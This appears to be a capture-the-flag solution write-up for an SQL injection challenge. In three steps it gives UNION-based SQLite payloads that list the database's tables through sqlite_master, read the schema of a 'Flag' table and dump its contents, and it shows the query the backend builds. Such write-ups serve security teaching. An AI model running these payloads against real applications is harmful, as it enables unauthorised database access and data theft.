# Solution

1. You can write this command to get the tables name from the database:
```
%' UNION SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' --
```
The final request behind the scene will translate to look like this:
```
SELECT name FROM Course WHERE name LIKE '%' UNION SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' -- %';
```

2. Then, once you spot the table `Flag`, you then need the structure of the table, for which this command
is useful:
```
%' UNION SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='Flag' --
```

3. With the structure and the name of the column for the table Flag `flag`, you can show it's content 
and win this challenge this way:
```
%' UNION SELECT flag FROM Flag --
```